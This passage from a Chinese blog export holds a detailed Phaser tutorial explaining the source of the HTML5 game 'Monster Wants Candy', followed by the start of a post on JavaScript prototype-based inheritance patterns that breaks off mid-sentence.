    <content type="text"><![CDATA[在这个特别长的教程里，我将详细解释“怪物要糖果”的代码。这是一个多平台游戏，使用Phaser（HTML5游戏引擎）制作。这样你就可以了解Phaser，并将学到的技巧用来创建你自己的HTML5游戏。说明如果你想制作HTML5游戏，最好选择一个框架或引擎。你可以用JavaScript写游戏，但使用一个框架，会大大提高开发效率。Phaser是一个新的HTML5游戏开发框架，如果你第一次听说它，那一定要试一试。Phaser是什么？Phaser是由Photon Storm开发的HTML5游戏框架。该框架用纯JavaScript编写，但也包含TypeScript定义文件 。Phaser 是基于Flash游戏开发平台 Flixel编写的，所以Flash开发者会感到很熟悉。它使用pixi.js 引擎在屏幕上用Canvas或WebGL渲染。这是相当新的引擎，在活跃社区html5gamedevs的帮助下增长迅速。已经有 很多的教程和文章 可以找到，你也可以查阅 官方文档 ，里面收集了大量的 开发实例 ，是非常有用的。Phaser是开源的，你可以直接深入了解并学习它的源代码。Phaser 最新的稳定版，是2.0. 7。什么是怪物要糖果？当我开始制作游戏，首先确定核心玩法，并尝试迅速建立了一个游戏原型。在这个案例中，我们从一个相当简单的演示 发展出来的游戏名字叫 怪物要糖果 。 首先我会告诉你项目的结构，所以你可以理解整个游戏玩法。我们将根据游戏运行的逻辑顺序来讲解：装载图片资源，创建主菜单，实际的游戏循环。你可以试玩怪物要糖果。怪物要糖果的故事很简单：邪恶的国王绑架了你的爱人，你必须收集足够多的糖果才能让她回来。玩法很简单：糖果掉落下来，你可以点击吃掉它们。你吃糖果越多，积分就越高，就会有更好的糖果被解锁。如果你让糖果掉出来屏幕，就会减少生命，然后游戏就结束了。正如你所看到的，这是一个非常简单但结构完整的游戏。你会发现框架的最重要的用途是，载入图像，绘制精灵以及检测用户活动。这是一个很好的开始，你可以复制代码，研究它们，制作你自己的游戏。项目设置及结构你可以阅读框架作者写的“如何开始使用Phaser” ，或者可以从GitHub复制 phaser.min.js 文件到你的项目目录。不需要IDE，点击 index.html就可以在浏览器 文件立即看到源代码所做的更改。我们的项目目录中包含 index.html 文件（包括HTML5结构和所有必要的JS文件）。还有两个子目录：IMG目录，里面是美术资源，SRC目录，里面是游戏的源代码。这里是目录结构预览：在 SRC 目录，你会看到JavaScript文件。在本教程中，我将描述在该文件夹中的所有文件的内容和用途。 你可以看到每个文件的源代码。index.html我们从index.html 文件开始。它看起来像一个HTML5网站，但代替文本和HTML元素是Phaser框架渲染的Canvas元素。12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8" /&gt;&lt;title&gt;Monster Wants Candy demo&lt;/title&gt;&lt;style&gt; body &#123; margin: 0; background: #B4D9E7; &#125; &lt;/style&gt;&lt;script src="src/phaser.min.js"&gt;&lt;/script&gt;&lt;script src="src/Boot.js"&gt;&lt;/script&gt;&lt;script src="src/Preloader.js"&gt;&lt;/script&gt;&lt;script src="src/MainMenu.js"&gt;&lt;/script&gt;&lt;script src="src/Game.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;(function() &#123;var game = new Phaser.Game(640, 960, Phaser.AUTO, 'game');game.state.add('Boot', Candy.Boot);game.state.add('Preloader', Candy.Preloader);game.state.add('MainMenu', Candy.MainMenu);game.state.add('Game', Candy.Game);game.state.start('Boot');&#125;)();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;我们在&lt;head&gt; 标签定义文档：字符集编码，网页标题以及CSS样式。通常我们会引用外部CSS文件，但在这里不需要，正如我前面提到的，一切都将在一个canvas元素中呈现，所以我们不会有任何的HTML元素。要做的最后一件事是：我们所有的JS文件：从 phaser.min.js 文件到所有包含游戏代码的文件。为了减少浏览器的请求数，使游戏的载入速度更快，我们将在游戏需要的时候单独载入它们。我们来看&lt;body&gt; 标签，在这里初始化框架并开始我们的游戏。第一行代码调用函数；看起来像这样：1var game = new Phaser.Game(640, 960, Phaser.AUTO, 'game');此代码将初始化Phaser：640 是游戏的宽度，960 是游戏的高度。phaser.auto 通知框架我们希望游戏如何渲染到画布上。这里有三个选项： CANVAS, WEBGL 和 AUTO。第一个将我们的游戏渲染在2D Canvas上；第二个使用WebGL在可能的情况下渲染游戏（现在主要用于桌面游戏，但是移动端支持也会越来越好）；第三个通知框架，自动检查是否支持WebGL，从而决定游戏如何呈现，如果不支持WebGL，那么2D Canvas将被使用。该框架初始化将被分配到单个对象称为 game。下一行的是关于我们的游戏：1game.state.add('Boot', Candy.Boot);‘Boot’ 是一个状态名， Candy.Boot 是一个对象（在下面代码中定义），我们开始进入状态时将被执行。我们为Boot 添加状态（配置），Preloader （加载资源），MainMenu （你猜对了；这是游戏主菜单）和Game （游戏主循环）。最后一行， game.state.start(‘Boot’)，启动Boot 状态，Candy.Boot 对象将被执行。你可以看到，一个主要的JavaScript游戏对象已被创建。在游戏中，我们有 Boot, Preloader, MainMenu,和 Game 对象，我们使用原型定义它们。有一些特殊功能的对象名被框架本身保留（preload() ，create() ，update()，和 render()），但我们也可以定义自己的（startgame() ，spawncandy() ，managepause()）。如果你不确定你明白这一切，别担心我会使用示例代码解释这一切。游戏现在让我们忘记 Boot, Preloader和 MainMenu 。他们将在以后详细解释；此刻你要知道的是Boot 状态决定游戏的基本配置， Preloader 将加载所有的美术资源，并 MainMenu 将开始游戏菜单。让我们关注游戏本身，看看Game代码。在解释game.js 代码之前，让我们从开发者的角度来谈谈游戏概念本身。Portrait 模式游戏是竖屏模式。在这种模式下，屏幕的高度大于其宽度。有的游戏适合竖屏（像怪物要糖果），有的游戏适合横屏（包括平台游戏， 比如Craigen），甚至某些类型的游戏在两种模式下都可以运行，通常这样的游戏比较难写。Game.js在我们开始game.js 文件之前，先看看它的结构。这里有一个为我们创造的世界，有一个玩家角色在里面，它的工作就是吃糖果。游戏世界：怪物后面的世界是静态的。背景中有一张糖果大陆的图片，我们可以在前景中看到怪物，还有一个用户界面。玩家角色： 这个演示非常简单，所以小怪物除了等待糖果什么也不做。对于玩家，主要任务就是收集糖果。糖果：游戏的核心机制是吃尽可能多的糖果。糖果在屏幕的顶部边缘产生，玩家必须在它们掉落的时候点击（或点击）。如果任何糖果掉出屏幕的底部，删除它，玩家将受到伤害。我们还没有生命系统，因此，游戏结束后立即显示适当的消息。好吧，现在让我们看看game.js：12345678910111213141516171819202122232425Candy.Game = function(game) &#123;// ...&#125;;Candy.Game.prototype = &#123;create: function() &#123;// ...&#125;,managePause: function() &#123;// ...&#125;,update: function() &#123;// ...&#125;&#125;;Candy.item = &#123;spawnCandy: function(game) &#123;// ...&#125;,clickCandy: function(candy) &#123;// ...&#125;,removeCandy: function(candy) &#123;// ...&#125;&#125;;Candy.Game有三个函数：· create() 初始化· managepause() 暂停和继续游戏· update() 管理游戏主循环我们将创建一个方便的对象称为 item 代表单一的糖果。它会有一些有用的方法：· spawncandy() 增加新糖果· clickcandy() 当用户点击时，糖果消失· removecandy() 删除糖果让我们使用这些代码：123456789Candy.Game = function(game) &#123;this._player = null;this._candyGroup = null;this._spawnCandyTimer = 0;this._fontStyle = null;Candy._scoreText = null;Candy._score = 0;Candy._health = 0;&#125;;在这里，我们声明所有将使用的变量。通过定义 this._name，我们限制了Candy.Game变量使用的范围。 这意味着他们不能用在其他状态中。通过定义Candy._name，我们允许这些变量被对象使用，例如， Candy._score 的数值可以被 Candy.item.clickCandy()函数增加。对象初始化为null，需要的变量初始化为零。看看candy.game.prototype的代码：12345678910111213141516171819202122create: function() &#123;this.physics.startSystem(Phaser.Physics.ARCADE);this.physics.arcade.gravity.y = 200;this.add.sprite(0, 0, 'background');this.add.sprite(-30, Candy.GAME_HEIGHT-160, 'floor');this.add.sprite(10, 5, 'score-bg');this.add.button(Candy.GAME_WIDTH-96-10, 5, 'button-pause', this.managePause, this);this._player = this.add.sprite(5, 760, 'monster-idle');this._player.animations.add('idle', [0,1,2,3,4,5,6,7,8,9,10,11,12], 10, true);this._player.animations.play('idle');this._spawnCandyTimer = 0;Candy._health = 10;this._fontStyle = &#123; font: "40px Arial", fill: "#FFCC00", stroke: "#333", strokeThickness: 5, align: "center" &#125;;Candy._scoreText = this.add.text(120, 20, "0", this._fontStyle);this._candyGroup = this.add.group();Candy.item.spawnCandy(this);&#125;,create() 函数开始之前，我们建立了ARCADE 物理系统—-Phaser中有现成的，这是最简单的一种。之后，我们添加了重力。然后我们添加三个图片：背景，怪物，得分UI。第四个增加的元素是暂停按钮，注意我们使用的是 candy.game_width和 candy.game_height 变量，定义在 Candy.Preloader() 。然后我们创建怪物，玩家的虚拟形象。这是一个动画精灵。看起来像是站着在呼吸。animations.add()函数创建帧动画，需要四个参数：· 动画的名称（可以参考它以后）· 包含所有帧的table（我们可以只使用其中一些）· 帧速· 一个决定动画是否循环的标签我们使用 animations.play() 播放动画。 我们将 spawncandytimer 设为0 ；的怪物生命 health设为10。文本格式接下来的两行代码，可以让我们在屏幕上显示文字。this.add.text()函数有四个参数：屏幕左侧和顶部的绝对位置，实际的文本字符串和配置对象。我们可以使用CSS那样设置文本格式。 代码如下：1234567this._fontStyle = &#123;font: "40px Arial",fill: "#FFCC00",stroke: "#333",strokeThickness: 5,align: "center"&#125;;字体是Arial，40像素高，黄色，可以设置描边（颜色和厚度），文本中心对齐。之后，我们定义 candygroup 和第一颗糖果。暂停游戏暂停功能看起来像这样：12345678managePause: function() &#123;this.game.paused = true;var pausedText = this.add.text(100, 250, "Game paused.\nTap anywhere to continue.", this._fontStyle);this.input.onDown.add(function()&#123;pausedText.destroy();this.game.paused = false;&#125;, this);&#125;,每次暂停按钮被点击时，我们改变this.game.paused状态为 true ，显示相应的提示给玩家，并为玩家单击或点击屏幕的行为建立一个事件侦听器。当单击或点击被检测到，我们删除文本并设 this.game.paused 为 false 。paused 变量在 game 对象中是特殊的，因为它将暂停游戏中所有动画以及计算，所以一切都被冻结，直到我们取消暂停，游戏暂停状态被设置为false。更新循环update() 函数Phaser保留的函数之一。当你用这个名字命名一个函数，它将在游戏的每一帧被执行。1234567891011121314update: function() &#123;this._spawnCandyTimer += this.time.elapsed;if(this._spawnCandyTimer &gt; 1000) &#123;this._spawnCandyTimer = 0;Candy.item.spawnCandy(this);&#125;this._candyGroup.forEach(function(candy)&#123;candy.angle += candy.rotateMe;&#125;);if(!Candy._health) &#123;this.add.sprite((Candy.GAME_WIDTH-594)/2, (Candy.GAME_HEIGHT-271)/2, 'game-over');this.game.paused = true;&#125;&#125;我们用spawncandytimer 变量来跟踪时间。if 语句每秒检查一次，在游戏世界中释放一个新糖果后时间是否被重置，（也就是说，对于spawncandytimer是 1000毫秒）。然后，我们用forEach遍历所有糖果对象内的糖果集团（我们可以有一个以上的屏幕上使用 ），增加固定的数值到糖果的angle变量（存储在糖果对象中的rotateMe），使他们以固定的速度下落。我们做的最后一件事是检查 health 是否 下降到0，如果这样的话，那么我们在屏幕上显示游戏结束并暂停游戏。糖果事件管理我们使用item定义糖果，包含的函数有： spawncandy() ，clickcandy() 和 removecandy()。为了方便使用在 Game保留一些糖果的变量。1234567891011121314151617spawnCandy: function() &#123;var dropPos = Math.floor(Math.random()*Candy.GAME_WIDTH);var dropOffset = [-27,-36,-36,-38,-48];var candyType = Math.floor(Math.random()*5);var candy = game.add.sprite(dropPos, dropOffset[candyType], 'candy');candy.animations.add('anim', [candyType], 10, true);game.physics.enable(candy, Phaser.Physics.ARCADE);candy.inputEnabled = true;candy.events.onInputDown.add(this.clickCandy, this);candy.checkWorldBounds = true;candy.events.onOutOfBounds.add(this.removeCandy, this);candy.anchor.setTo(0.5, 0.5);candy.rotateMe = (Math.random()*4)-2;game._candyGroup.add(candy);&#125;,函数首先定义三个值：· 糖果随机下落x坐标（数值在0和游戏画面宽度之间）· 糖果随机下落y坐标，基于糖果自身的高度· 随机的糖果类型（糖果一共有五个不同的图像）然后我们添加一个糖果作为精灵，其起始位置和图像根据上面的定义。我们还需要为糖果旋转设定动画帧。接下来我们用物理引擎使糖果自然地从屏幕顶部坠落。然后，我们使糖果对点击产生回应，加入事件监听器。为确保糖果离开游戏屏幕时被销毁，我们将checkWorldBounds 设为true。糖果离开屏幕时，函数events.onOutOfBounds()将被调用；我们用它调用removecandy() 函数。设置锚点在糖果上，使其绕轴线旋转。在这里我们设置了 rotateMe 变量，在update()循环中转动糖果；我们选择 -2和 +2之间的一个值。最后一行代码将新创建的糖果加入到糖果群组，这样我们就可以不停的循环他们 。我们来讲下一个函数， clickcandy()：12345clickCandy: function(candy) &#123;candy.kill();Candy._score += 1;Candy._scoreText.setText(Candy._score);&#125;,这里需要将一个糖果作为参数，采用Phaser自带的方法 kill() 删除它。我们还增加了得分1，并更新得分的文本。重置糖果也同样容易和简单：1234removeCandy: function(candy) &#123;candy.kill();Candy._health -= 10;&#125;,当糖果被点击或掉出屏幕。removecandy() 函数会被调用。candy对象会被删除，玩家失去10点生命。（游戏一开始玩家有10点生命，所以有一个糖果掉出屏幕游戏就结束了）原型和游戏状态我们已经了解了游戏机制，核心理念，以及游戏玩法。现在是时候去看代码的其他部分了：加载屏幕，加载资源，管理按钮点击等等。我们已经知道了游戏状态，让我们一个接一个看看他们：Boot.jsboot.js 是JavaScript文件，我们将定义主要游戏对象Candy（你可以取个你喜欢的名字）。这里boot.js 文件的源代码：123456789101112131415var Candy = &#123;&#125;;Candy.Boot = function(game) &#123;&#125;;Candy.Boot.prototype = &#123;preload: function() &#123;this.load.image('preloaderBar', 'img/loading-bar.png');&#125;,create: function() &#123;this.input.maxPointers = 1;this.scale.scaleMode = Phaser.ScaleManager.SHOW_ALL;this.scale.pageAlignHorizontally = true;this.scale.pageAlignVertically = true;this.scale.setScreenSize(true);this.state.start('Preloader');&#125;&#125;;正如你所看到的，我们从 var Candy = {} 开始，为游戏创建了一个全局对象。Candy.Boot = function(game){} 代码创建一个新函数称为 boot() （index.html 有调用）将game 对象作为参数（index.html也被创建 ）。Candy.Boot.prototype = {} 代码是使用原型定义Candy.Boot 内容的一种方式。12345678Candy.Boot.prototype = &#123;preload: function() &#123;// code&#125;,create: function() &#123;// code&#125;&#125;;Phaser有一些保留的函数名称，正如我之前提到 ；preload() 和 create() 就是其中的两个。 preload() 用于加载所有资源； create() 只调用一次（在 preload()之后），所以你可以把代码当对象一样安排，就像定义变量或添加精灵。我们的Boot对象包含这两个函数，这样他们就可以被Candy.Boot.preload()和Candy.Boot.create()调用。正如你所看到 boot.js 文件的完整的源代码，preload() 函数加载了一个图像到框架中：123preload: function() &#123;this.load.image('preloaderBar', 'img/loading-bar.png');[size=14px]&#125;,this.load.image()中第一个参数是我们给图像取的名字，第二个是图像文件的路径。为什么我们要在 boot.js 文件中加载图像，用preload.js 不行吗？好吧，因为我们需要一个加载条来显示所有资源（preload.js）的加载状态， 因此它需要第一个被加载。缩放选项create() 函数包含了一些Phaser特定的输入和缩放设置：12345678create: function() &#123;this.input.maxPointers = 1;this.scale.scaleMode = Phaser.ScaleManager.SHOW_ALL;this.scale.pageAlignHorizontally = true;this.scale.pageAlignVertically = true;this.scale.setScreenSize(true);this.state.start('Preloader');&#125;第一行，input.maxpointers 设为1，我们的游戏不需要多点触摸。scale.scalemode 控制游戏的旋转。可用的设置有： exact_fit ，no_scale 和 show_all你可以枚举他们，使用数值0，1，或2。exact_fit，将最大化游戏；no_scale将禁用缩放；show_all将确保游戏符合给定的尺寸，一切都会显示在屏幕上（按比例缩放 ）。将 scale.pagealignhorizontally 和 scale.pagealignvertically 设为 true ，将使游戏在水平和垂直方向居中。调用 scale.setScreenSize(true) “激活”缩放。最后一行， state.start(‘Preloader’)，执行下一个Preloader 状态Preloader.js与preload()函数相比，create() 函数非常简单，因为 create() 函数只需要负责切换状态。preloader.js 源代码：1234567891011121314151617181920212223242526272829Candy.Preloader = function(game)&#123;Candy.GAME_WIDTH = 640;Candy.GAME_HEIGHT = 960;&#125;;Candy.Preloader.prototype = &#123;preload: function() &#123;this.stage.backgroundColor = '#B4D9E7';this.preloadBar = this.add.sprite((Candy.GAME_WIDTH-311)/2,(Candy.GAME_HEIGHT-27)/2, 'preloaderBar');this.load.setPreloadSprite(this.preloadBar);this.load.image('background', 'img/background.png');this.load.image('floor', 'img/floor.png');this.load.image('monster-cover', 'img/monster-cover.png');this.load.image('title', 'img/title.png');this.load.image('game-over', 'img/gameover.png');this.load.image('score-bg', 'img/score-bg.png');this.load.image('button-pause', 'img/button-pause.png');this.load.spritesheet('candy', 'img/candy.png', 82, 98);this.load.spritesheet('monster-idle','img/monster-idle.png', 103, 131);this.load.spritesheet('button-start','img/button-start.png', 401, 143);&#125;,create: function() &#123;this.state.start('MainMenu');&#125;&#125;;与 boot.js 比较像；定义 Preloader 对象和两个原型函数（preload() 和 create()）。Prototype 对象，我们定义了两个变量： candy.game_width 和 candy.game_height；它们设置游戏屏幕默认的宽度和高度。preload() 的前3行代码设置舞台的背景颜色（ # b4d9e7，浅蓝色），显示游戏中的精灵，setPreloadSprite() 函数将负责资源的加载。 我们来看add.sprite() 函数：this.preloadBar = this.add.sprite((640-311)/2, (960-27)/2, ‘preloaderBar’);正如你所看到的，我们需要三个值：图像x轴绝对坐标（舞台宽度减去图像宽度再除以2），图像y轴绝对坐标（类似计算）以及图像的名称（我们已经在 boot.js 文件中加载）。加载spritesheets接下来的几行是使用 load.image() （你已经看到了）加载所有的图形资源。最后3行代码有点不同：1this.load.spritesheet('candy', 'img/candy.png', 82, 98);load.spritesheet()函数，不是加载单一的图片，而是spritesheet。两个额外的参数告诉函数单个图像的尺寸。在这里candy.png我们有5种不同类型的糖果。图片尺寸410x98px，但是单一元素的大小是82x98px，在load.spritesheet()函数中定义。玩家spritesheet以同样的方式加载。create()函数开始游戏的下一个状态MainMenu，当所有资源加载完毕就会显示游戏菜单。MainMenu.js在这里渲染图片，添加按钮以及游戏循环。12345678910111213Candy.MainMenu = function(game) &#123;&#125;;Candy.MainMenu.prototype = &#123;create: function() &#123;this.add.sprite(0, 0, 'background');this.add.sprite(-130, Candy.GAME_HEIGHT-514, 'monster-cover');this.add.sprite((Candy.GAME_WIDTH-395)/2, 60, 'title');this.add.button(Candy.GAME_WIDTH-401-10, Candy.GAME_HEIGHT-143-10,'button-start', this.startGame, this, 1, 0, 2);&#125;,startGame: function() &#123;this.state.start('Game');&#125;&#125;;MainMenu没有preload()函数，因为资源已在Preload.js加载。这里有2个函数，create()，startGame()。 先看 startGame() 函数:123startGame: function() &#123;this.state.start('Game');&#125;这个函数只负责开始游戏循环，但是它不会自动执行，我们需要通过按钮来触发它。1234567create: function() &#123;this.add.sprite(0, 0, 'background');this.add.sprite(-130, Candy.GAME_HEIGHT-514, 'monster-cover');this.add.sprite((Candy.GAME_WIDTH-395)/2, 60, 'title');this.add.button(Candy.GAME_WIDTH-401-10, Candy.GAME_HEIGHT-143-10,'button-start', this.startGame, this, 1, 0, 2);&#125;,create()有3个add.sprite()函数，它们加载图片到舞台上。我们的主菜单在背景上，小怪物在角落里，还有游戏的标题。按钮还有一个我们早已在Game 状态使用的对象，就是按钮：1this.startButton = this.add.button(Candy.GAME_WIDTH-401-10, Candy.GAME_HEIGHT-143-10,'button-start', this.startGame, this, 1, 0, 2);这个按钮看起来比我们之前的代码都要复杂。我们通过八种不同的参数创建按钮：x轴位置，y轴位置，图像的名称（或精灵），单击该按钮时执行的函数，该函数执行环境，指定按钮使用的图片。这是按钮的spritesheet，包含状态标签：与candy.png非常相似，垂直排列。记住最后三位数字传递给函数的意义—1 0 2-它们分别代表按钮的不同状态：over（鼠标悬停），out（正常），和down（触摸或点击）。在 button.png我们有不同的图片代表他们。现在你已经了解了Phaser游戏框架的基础。恭喜你！游戏成品本文中使用的demo游戏已经演变成一个完整的游戏 ， 你可以在这里玩。你看，有生命，成就，得分，和其他有趣的功能，他们中的大多数都基于你已经学到的知识。&nbsp;你还可以阅读 这一篇记录 ，了解游戏起源以及游戏背后的故事，还有一些有趣的事实。资源在过去的几个月里，为移动设备开发HTML5游戏已经非常流行了。该技术将越来越好，几乎每天都有新的工具和服务出现，现在是进入潜在市场的最佳时机。类似Phaser这样的引擎给了你开发适配各种不同手机设备游戏的能力。多亏了HTML5，你的目标不再仅仅是移动平台和桌面浏览器，还将包括其他不同的操作系统和原生平台。现在有很多资源可以帮助你进入HTML5游戏开发，例如 HTML5游戏开发新手教程 列表或者 开始用HTML5开发游戏 。如果你需要任何帮助，可以在html5gamedevs 论坛寻求帮助或直接在 freenode IRC的# BBG通道上提问。你还可以关注即将发布的新书Firefox OS and HTML5 games。甚至还有一个Gamedev.js Weekly 通邮件列表你可以订阅。概要这是一段关于怪物要糖果demo代码的漫长旅程，我希望能帮助你学习Phaser，在不久的将来你可以开发很酷的游戏。]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>phaser 怪物要糖果demo</tag>
        <tag>phaser教程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript 面向对象继承详解]]></title>
    <url>%2F2015%2F08%2F29%2Fjavascript-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BB%A7%E6%89%BF%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[题记关于继承已经是老生常谈的事情了，不管是css的继承还是js的继承，都已经出了不少文章，本次将继续和大家一起探讨js中面向对象的继承。由于js不像java那样是完全面向对象的语言，js是基于对象的，它没有类的概念。所以，要想实现继承，一般都是基于原型链的方式；一、继承初探大多数JavaScript的实现用 __proto__ 属性来表示一个对象的原型链。我们可以简单的把prototype看做是一个模版，新创建的自定义对象都是这个模版（prototype）的一个拷贝 （实际上不是拷贝而是链接，只不过这种链接是不可见，新实例化的对象内部有一个看不见的__proto__指针，指向原型对象)当查找一个对象的属性时，JavaScript 会向上遍历原型链，直到找到给定名称的属性为止。查找方式可以这样表示：1234567891011function getProperty(obj, prop) &#123;if (obj.hasOwnProperty(prop)) &#123;return obj[prop];&#125;else if (obj.__proto__ !== null) &#123;return getProperty(obj.__proto__, prop);&#125;else &#123;return undefined;&#125;&#125;我们在js中使用面向对象很多时候是这样子的：123456789101112function Person(name,age)&#123;this.name = name;this.age = age;&#125;Person.prototype.printInfo = function()&#123;console.log(this.name + ': ' + this.age);&#125;;var person = new Person('Jack',17);person.printInfo(); // Jack: 17而变一下，可以发现，这种方式也是可以的1234567891011121314151617var Person = &#123;/* 声明所需的项 */name : 'name',age: 'age',printInfo: function()&#123;console.log(this.name + ': ' + this.age);&#125;&#125;;var person = &#123;name: 'Jack',age: 17,__proto__: Person&#125;;person.printInfo(); // Jack: 17其实这里就是通过将 proto 指向了Person从而达到了原型继承的目的（这也许也是后续某种继承方式的来源）以上两种方式是等价的，但我们看到的更多还是new方式来产生实例对象，其实new方式也是通过继承方式实现的，那一个new 究竟做了什么操作呢？有两个版本，哪个比较中肯就用哪个吧1）1、创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型（即把proto属性设置为该对象的prototype。2、属性和方法被加入到 this 引用的对象中（使用apply传参调用）。3、新创建的对象由 this 所引用，并且最后隐式的返回实例。用代码实现应该就是这样的123456789/* new Constructor() */function new (f) &#123;var n = &#123; '__proto__': f.prototype &#125;; /* step 1 */return function () &#123;f.apply(n, arguments); /* step 2 */return n; /* step 3 */&#125;;&#125;2）123var obj = &#123;&#125;;obj.__proto__ = Base.prototype;Base.call(obj);不过我用代码实现的时候，两种情况都出现了无线调用堆栈溢出的情况，也许new的操作内部没那么简单 二、继承方式概览说了那么多new 也乱了，不如直接切入正题，谈谈js流行的几种继承方式1）对象冒充对象冒充也分为几类 – 添加临时属性、apply/call等方式添加临时属性缺点是只能继承显示指明的属性，原型上的属性没办法12345678910111213141516171819202122function Parent(name)&#123;this.name = name;this.words = 'words';this.say = function()&#123;console.log(this.name + ': ' + this.words);&#125;;&#125;Parent.prototype.say1 = function()&#123;console.log(this.name + ': ' + this.words);&#125;;function Child(name)&#123;this.temp = Parent;this.temp(name);// 传参name后即可获取到相应name,words属性，即可销毁tempdelete this.temp;&#125;var child = new Child('child');child.say();child.say1();call/apply实际上是改变了Parent中this的指向，原理跟上个方法一样，但也不能拿到原型的属性1234567891011121314151617181920function Parent(name)&#123;this.name = name;this.words = 'words';this.say = function()&#123;console.log(this.name + ': ' + this.words);&#125;;&#125;Parent.prototype.say1 = function()&#123;console.log(this.name + ': ' + this.words);&#125;;function Child(name)&#123;//Parent.call(this,name);Parent.apply(this,[name]);&#125;var child = new Child('child');child.say();child.say1();对象冒充还有一个缺点就是易造成内存的浪费因为每次冒充的过程都需要实例化一次父对象，而每次实例化的过程，this显示指明的属性将在每个实例中独立存在，不会共用。比如say()这种方法，每次调用Child都会新产生并。而原型上的say1()方法就可以共用。&nbsp;2）原型链继承这种继承方式也许是最常见的了：将父类的新实例赋值给构造函数的原型1234567891011121314151617181920212223function Parent(name)&#123;this.name = name;this.words = 'words';this.say = function()&#123;console.log(this.name + ': ' + this.words);&#125;;&#125;Parent.prototype.say1 = function()&#123;console.log(this.name + ': ' + this.words);&#125;;function Child(name)&#123;this.name = name;&#125;Child.prototype = new Parent();// 如果不加上这句，Child的constructor就会被Parent的覆盖，变成 ParentChild.prototype.constructor = Child;var child = new Child('child');child.say();child.say1();可以看到，child不仅可以继承到parent的say()也能拿到say1() ,关键点在于 new Parent()这个new操作根据最开始我们谈到的new操作，可以知道它具体干了什么下面来一个变体，这种方式也行，虽然不必在Child中再次定义this.name ,但再次new Child()时，就不能更新我们需要的值。所以这应该也算是原型链继承的一个不足吧1234567891011121314151617181920function Parent(name)&#123;this.name = name;this.words = 'words';&#125;Parent.prototype.say1 = function()&#123;console.log(this.name + ': ' + this.words);&#125;;function Child()&#123;&#125;// 直接在参数中写childChild.prototype = new Parent('child');Child.prototype.constructor = Child;// 这样 newChild就无效了var child = new Child('newChild');child.say1();var p = new Parent();p.say1(); // child: words3) 原型链+对象冒充（借用构造函数）原型链方式和对象冒充方式都各有缺陷，两者的缺陷正是对方的优势。两者一结合，自然又是一个好方法，就叫它组合继承吧。它背后的思路是 使用原型链实现对原型属性和方法的继承，而通过借用构造函数来实现对实例属性的继承。这样，既通过在原型上定义方法实现了函数复用，又保证每个实例都有它自己的属性。12345678910111213141516171819function Parent(name)&#123;this.name = name;this.words = 'words';&#125;Parent.prototype.say1 = function()&#123;console.log(this.name + ': ' + this.words);&#125;;function Child(name)&#123;// 对象冒充Parent.call(this,name);&#125;// 原型链继承Child.prototype = new Parent();Child.prototype.constructor = Child;var child = new Child('child');child.say1(); // child: words4）直接继承父类的 prototype我们知道了原型链的继承是Child.prototype = new Parent();那可不可以跳过实例化父类，直接拿Parent的原型呢？Child.prototype = Parent.prototype;其实这也是可以的，来看个例子。123456789101112131415161718192021222324function Parent(name)&#123;this.name = name;this.words = 'words';&#125;Parent.prototype.age = 30;Parent.prototype.sayAge = function()&#123;console.log(this.age);&#125;;Parent.prototype.say = function()&#123;console.log(this.name + ': ' + this.words);&#125;;function Child(name)&#123;// Parent.call(this,name);&#125;// 直接继承父类prototypeChild.prototype = Parent.prototype;Child.prototype.constructor = Child;var child = new Child('child');child.say(); // undefined: undefinedchild.sayAge(); //30可以看到，这种方式仅仅只能拿到父类的原型属性，实例上的name和words属性就拿不到了。如果想拿，那就使用Parent.call(this.name)就可以啦。由此看来，直接用prototype应该会更快，因为不需要像上一个方法那样实例化一个对象耗时。但也是有缺点的。缺点是 Child.prototype和Parent.prototype现在指向了同一个对象，那么任何对Child.prototype的修改，都会反映到Parent.prototype。1234567891011121314151617181920212223242526272829function Parent(name)&#123;this.name = name;this.words = 'words';&#125;Parent.prototype.age = 30;Parent.prototype.sayAge = function()&#123;console.log(this.age);&#125;;Parent.prototype.say = function()&#123;console.log(this.name + ': ' + this.words);&#125;;function Child(name)&#123;Parent.call(this,name);&#125;// 直接继承父类prototypeChild.prototype = Parent.prototype;//Child.prototype = new Parent();Child.prototype.constructor = Child;var child = new Child('child');child.say();child.sayAge();Child.prototype.age = 40;console.log(Parent.prototype.age); // 40可以看到父级的原型也被更改了，而原型链继承的方式则不会。但聪明的人类想出了一个好办法：用一个空对象作为中介，再利用操作prototype，既避免了实例化对象产生太多的耗时，又避免的父子prototype混用的情况。12345678910111213141516171819202122232425262728293031323334function Parent(name)&#123;this.name = name;this.words = 'words';&#125;Parent.prototype.age = 30;Parent.prototype.sayAge = function()&#123;console.log(this.age);&#125;;Parent.prototype.say = function()&#123;console.log(this.name + ': ' + this.words);&#125;;function Child(name)&#123;Parent.call(this,name);&#125;// 封装成函数function extend(Child,Parent)&#123;// 中介对象function F()&#123;&#125;F.prototype = Parent.prototype;Child.prototype = new F();Child.prototype.constructor = Child;&#125;// 继承extend(Child,Parent);var child = new Child('child');child.say();child.sayAge();Child.prototype.age = 40;console.log(Parent.prototype.age); // 305）原型式继承这种继承借助原型并基于已有的对象创建新对象，同时还不用创建自定义类型的方式称为原型式继承。可以封装成一个方法，这方法其实只做一件事，就是把子对象的prototype属性，指向父对象，从而使得子对象与父对象连在一起。1234567891011121314151617181920212223242526var Parent = &#123;name : 'parent',words: ['word1','word2'],say: function()&#123;console.log(this.name + ': ' + this.words);&#125;&#125;;// 封装成方法Object.create = function(Parent)&#123;function F()&#123;&#125;// 这里不用F.prototype = Parent.prototype的原因是// 通过对象字面量定义的Parent对象没有这个直接的prototype属性（属于Object的）// 如果通过 function Parent()方式定义则可以F.prototype = Parent;return new F();&#125;;var Child = Object.create(Parent);Child.say();Child.name = 'child';Child.words.push('word3');Child.say();Parent.say();Child继承了父类的属性方法后就可以自行更新属性值或再定义了，不过这里存在一个属性共享问题。如果是引用类型的数据，比如Object 